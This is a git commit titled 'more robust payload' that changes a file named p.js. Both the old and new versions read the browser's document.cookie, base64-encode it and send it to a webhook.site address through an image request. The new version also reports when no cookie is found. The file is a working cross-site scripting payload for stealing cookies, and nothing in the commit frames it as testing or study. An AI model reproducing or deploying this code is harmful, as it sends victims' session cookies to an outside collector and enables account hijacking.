1a02ae256bf0113ecfd33ef2c3778c42654e851e
ronaldulate <ronaldulate@gmail.com>
2026-06-24 10:39:31 -0600

    more robust payload

--- p.js
+++ p.js
@@ -1,1 +1,6 @@
-new Image().src='https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?c='+btoa(document.cookie);
+var c=document.cookie;
+if(c){
+  new Image().src='https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?c='+encodeURIComponent(btoa(c));
+}else{
+  new Image().src='https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?nocookie=1';
+}
